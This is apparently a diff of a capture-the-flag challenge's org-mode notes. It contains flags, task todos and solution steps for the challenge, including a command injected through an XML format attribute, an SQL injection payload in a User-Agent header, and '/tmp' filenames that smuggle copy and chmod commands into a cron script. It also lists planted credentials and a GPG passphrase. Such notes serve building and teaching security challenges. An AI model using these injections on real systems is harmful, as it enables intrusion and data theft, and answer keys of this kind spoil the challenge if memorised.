@@ -40,7 +40,6 @@
   
   <query action="getTimeWithFormat" format='%m";id;f="' />
 </WTIIaaS>
-
 ** DONE Password dump
    CLOSED: [2017-02-25 Sat 01:12]
 | Christia | Shore | shore.christia@wtiiaas.csg | f6432274349b5cb93433f8ed886a3f37 | winter |
@@ -53,8 +52,6 @@ One of the ways to get to the intranet
    User-Agent: ' or extractvalue(1,concat(0x7e,(SELECT * from flag limit 0,1))) or '
    
    CSG_SomeThingsAreStrange
-*** SQL login → logging:JF8KI4iYQWNbjWtn
-
 ** DONE Steal the CEO's cookies
    CLOSED: [2017-03-01 Wed 23:14]
 *** PoC
@@ -66,7 +63,8 @@ One of the ways to get to the intranet
     Vulnerable bash script running through crontab, as sysadmin
     Create files in /tmp with filename containing trailing bash commands.
     ie run $ touch "/tmp/a;cp -R \$HOME ."
-    This will copy sysadmin's homedir to /tmp. You can chain commands by creating more files. ie to chmod 777 the new directory.
+    and then $ touch "/tmp/a;chmod -R 777 sysadmin"
+    This will copy sysadmin's homedir to /tmp and make it world-readable. 
 *** Decrypted file content
     $ gpg --passphrase "@\!YOUcantGUESSthis#@\!" --decrypt banking.txt.pgp
     Bank account
@@ -75,7 +73,10 @@ One of the ways to get to the intranet
     Password : HS9;~7HP9P@tYm;8nvo[|mL;:D%BwUh5-X'0!v%I
     
 * Todos
-** TODO Make mysql start automatically
+** DONE Make mysql start automatically
+   CLOSED: [2017-03-11 Sat 02:21]
+** DONE Setup Mysql schema on image run
+   CLOSED: [2017-03-11 Sat 15:05]
 ** WONTFIX Fix images in team (CFO/CTO)
 ** DONE Make API documentation in HTML
    CLOSED: [2017-03-09 Thu 16:01]
@@ -106,16 +107,25 @@ One of the ways to get to the intranet
     $ gpg --batch --yes --passphrase "@\!YOUcantGUESSthis#@\!" --output banking.txt.pgp --symmetric banking.txt
 ** DONE Add extra ways to login to intranet
    CLOSED: [2017-03-10 Fri 21:35]
-** In Process Clean database before export
+** DONE Clean database before export
+   CLOSED: [2017-03-11 Sat 15:06]
 ** DONE Make app use dedicated SQL user (nonroot)
    CLOSED: [2017-03-02 Thu 00:47]
-** TODO Fix Dockerfile
-** TODO Make webserver non www-data read-ONLY
-** TODO Modify root password from ENV variable that will be set when container is RUN
+** DONE Fix Dockerfile
+   CLOSED: [2017-03-11 Sat 02:20]
+** DONE Make webserver non www-data read-ONLY
+   CLOSED: [2017-03-11 Sat 02:20]
+** DONE Modify root password from ENV variable that will be set when container is RUN
+   CLOSED: [2017-03-11 Sat 02:20]
+** DONE Clean .bash_history for sysadmin to show GPG symmetric password
+   CLOSED: [2017-03-11 Sat 02:20]
 * Flags
 ** CSG-CIACantBreakThisCrapto (Crypto intranet message)
 ** CSG-WowItsAsIfXSSIsActuallyABigDeal (XSS)
 ** CSG_SomeThingsAreStrange (SQLi User-Agent)
+** CSG-HarvestAllTheSessions (Steal session through XSS and check CEO's messages)
+
+
 * Instructions
 Camarades, l'heure est grave. Les écrits du camarade Mao s'avèrent véridique: l'impérialisme de l'Ouest prend notre patrie en otage! Voilà pourquoi nous avons créés une unité super-méga-secrète qui nous permettera de partir en cyber-guerre contre ces américains assoiffés de profit! Ces jeunes programmeurs milliardaires de 20 ans causent un embarras incomensurable à la patrie, nous nous devons de lutter!
 
